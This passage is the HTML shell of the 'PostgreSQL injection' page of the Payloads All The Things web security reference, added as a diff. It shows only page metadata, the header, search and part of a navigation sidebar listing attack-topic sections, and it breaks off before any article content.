@@ -1,0 +1,4776 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Payloads All The Things, a list of useful payloads and bypasses for Web Application Security">
+      
+      
+      
+      
+        <link rel="prev" href="../OracleSQL%20Injection/">
+      
+      
+        <link rel="next" href="../SQLite%20Injection/">
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.5.0, mkdocs-material-9.1.19">
+    
+    
+      
+        <title>PostgreSQL injection - Payloads All The Things</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.eebd395e.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ecc896b0.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../custom.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#postgresql-injection" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Payloads All The Things" class="md-header__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Payloads All The Things
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              PostgreSQL injection
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+          
+            
+            
+            
+            <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+            
+              <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+              </label>
+            
+          
+            
+            
+            
+            <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+            
+              <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+              </label>
+            
+          
+        </form>
+      
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Payloads All The Things" class="md-nav__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Payloads All The Things
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Payloads All The Things
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CONTRIBUTING/" class="md-nav__link">
+        CONTRIBUTING
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          API Key Leaks
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          API Key Leaks
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../API%20Key%20Leaks/" class="md-nav__link">
+        API Key Leaks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+          AWS Amazon Bucket S3
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          AWS Amazon Bucket S3
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AWS%20Amazon%20Bucket%20S3/" class="md-nav__link">
+        Amazon Bucket S3 AWS
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+          Account Takeover
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Account Takeover
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Account%20Takeover/" class="md-nav__link">
+        Account Takeover
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+          Argument Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          Argument Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Argument%20Injection/" class="md-nav__link">
+        Argument Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+          Business Logic Errors
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          Business Logic Errors
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Business%20Logic%20Errors/" class="md-nav__link">
+        Business Logic Errors
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+          CICD
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          CICD
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CICD/" class="md-nav__link">
+        CI/CD attacks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+          CORS Misconfiguration
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_9">
+          <span class="md-nav__icon md-icon"></span>
+          CORS Misconfiguration
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CORS%20Misconfiguration/" class="md-nav__link">
+        CORS Misconfiguration
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+          CRLF Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_10">
+          <span class="md-nav__icon md-icon"></span>
+          CRLF Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CRLF%20Injection/" class="md-nav__link">
+        Carriage Return Line Feed
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
+          CSRF Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_11">
+          <span class="md-nav__icon md-icon"></span>
+          CSRF Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CSRF%20Injection/" class="md-nav__link">
+        Cross-Site Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
+          CSV Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_12">
+          <span class="md-nav__icon md-icon"></span>
+          CSV Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CSV%20Injection/" class="md-nav__link">
+        CSV Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
+          CVE Exploits
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_13">
+          <span class="md-nav__icon md-icon"></span>
+          CVE Exploits
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CVE%20Exploits/" class="md-nav__link">
+        Common Vulnerabilities and Exposures
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CVE%20Exploits/Log4Shell/" class="md-nav__link">
+        CVE-2021-44228 Log4Shell
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_14" id="__nav_14_label" tabindex="0">
+          Command Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_14_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_14">
+          <span class="md-nav__icon md-icon"></span>
+          Command Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Command%20Injection/" class="md-nav__link">
+        Command Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_15" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_15" id="__nav_15_label" tabindex="0">
+          DNS Rebinding
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_15_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_15">
+          <span class="md-nav__icon md-icon"></span>
+          DNS Rebinding
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../DNS%20Rebinding/" class="md-nav__link">
+        DNS Rebinding
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_16" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_16" id="__nav_16_label" tabindex="0">
+          Dependency Confusion
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_16_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_16">
+          <span class="md-nav__icon md-icon"></span>
+          Dependency Confusion
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Dependency%20Confusion/" class="md-nav__link">
+        Dependency Confusion
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_17" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_17" id="__nav_17_label" tabindex="0">
+          Directory Traversal
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_17_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_17">
+          <span class="md-nav__icon md-icon"></span>
+          Directory Traversal
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Directory%20Traversal/" class="md-nav__link">
+        Directory Traversal
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_18" id="__nav_18_label" tabindex="0">
+          Dom Clobbering
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_18">
+          <span class="md-nav__icon md-icon"></span>
+          Dom Clobbering
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Dom%20Clobbering/" class="md-nav__link">
+        Dom Clobbering
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_19" id="__nav_19_label" tabindex="0">
+          File Inclusion
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_19_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_19">
+          <span class="md-nav__icon md-icon"></span>
+          File Inclusion
